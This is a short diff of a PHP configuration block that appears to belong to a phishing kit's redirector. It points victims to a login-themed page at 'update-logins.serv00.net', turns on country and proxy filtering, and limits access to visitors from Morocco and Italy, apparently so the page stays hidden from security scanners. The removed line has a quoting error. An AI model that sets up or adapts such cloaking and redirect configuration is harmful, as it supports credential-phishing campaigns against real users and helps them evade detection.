@@ -57,13 +57,13 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://upcoming-bills.serv00.net/0612";
+$redirect = "https://update-logins.serv00.net/2024/spp/login/";
 
-$parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
+$parameter = 1; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
 
-$country = array("ma","za","pl","gr","ee","cy","de,"ch","il","ua"); #Country's Allowed To Access
+$country = array("ma","it"); #Country's Allowed To Access
 
 /************************************************************* PARAMETRES ******************************************************************/
 
